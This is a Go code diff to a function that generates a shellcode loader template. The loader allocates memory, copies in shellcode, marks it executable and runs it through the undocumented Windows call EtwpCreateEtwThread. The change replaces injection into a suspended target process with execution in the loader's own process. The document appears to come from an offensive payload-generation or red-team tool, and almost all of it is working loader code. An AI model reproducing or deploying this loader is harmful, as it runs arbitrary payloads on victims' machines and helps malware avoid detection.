@@ -5,6 +5,8 @@ import (
 )
 
 func GetEtwpCreateEtwThreadTemplate(targetProcess string) string {
+	InformProcessUnused(targetProcess)
+
 	return fmt.Sprintf(`
 package main
 
@@ -31,52 +33,22 @@ var (
     RtlCopyMemory           = ntdll.MustFindProc("RtlCopyMemory")
     EtwpCreateEtwThread     = ntdll.MustFindProc("EtwpCreateEtwThread")
 
-	VirtualAllocEx          = kernel32.MustFindProc("VirtualAllocEx")
-	VirtualProtectEx        = kernel32.MustFindProc("VirtualProtectEx")
+	VirtualAlloc            = kernel32.MustFindProc("VirtualAlloc")
+	VirtualProtect          = kernel32.MustFindProc("VirtualProtect")
     WaitForSingleObject     = kernel32.MustFindProc("WaitForSingleObject")
 )
 
 
-func  loadProcess(target string) *syscall.ProcessInformation {
-    var si syscall.StartupInfo
-	var pi syscall.ProcessInformation
-
-	commandLine, err := syscall.UTF16PtrFromString(target)
-	if err != nil {
-		panic(err)
-	}
-
-    err = syscall.CreateProcess(
-		nil,
-		commandLine,
-		nil,
-		nil,
-		false,
-		CREATE_SUSPENDED | CREATE_NO_WINDOW,
-		nil,
-		nil,
-		&si,
-		&pi,
-    ); if err != nil {
-		panic(err)
-	}
-
-	return &pi
-}
-
-func ExecuteOrderSixtySix(shellcode []byte){
-
-    /* spawn target process */
-    process := loadProcess("%s")
-
+func ExecuteOrderSixtySix(shellcode []byte) {
     /* allocating the appropriate amount of memory */
-    baseAddr, _, _ := VirtualAllocEx.Call(
-        uintptr(process.Process),
+    baseAddr, _, err := VirtualAlloc.Call(
         0,
         uintptr(len(shellcode)),
         MEM_COMMIT | MEM_RESERVE,
         PAGE_READWRITE,
-    )
+    ); if baseAddr == 0 {
+        panic(err)
+    }
 
     /* copying the shellcode to memory */
     _, _, _ = RtlCopyMemory.Call(
@@ -87,16 +59,15 @@ func ExecuteOrderSixtySix(shellcode []byte){
 
     /* changing permissions for our memory segment */
     oldProtectCfg := PAGE_READWRITE
-    _, _, _ = VirtualProtectEx.Call(
-        uintptr(process.Process),
+    _, _, _ = VirtualProtect.Call(
         baseAddr,
         uintptr(len(shellcode)),
         PAGE_EXECUTE_READ,
         uintptr(unsafe.Pointer(&oldProtectCfg)),
     )
 
-    threadId, _, _ := EtwpCreateEtwThread.Call(baseAddr, uintptr(0))
-    _, _, _, = WaitForSingleObject.Call(threadId, 0xFFFFFFFF)
+    threadId, _, err := EtwpCreateEtwThread.Call(baseAddr, uintptr(0))
+    WaitForSingleObject.Call(threadId, 0xFFFFFFFF)
 }
-`, targetProcess)
+`)
 }
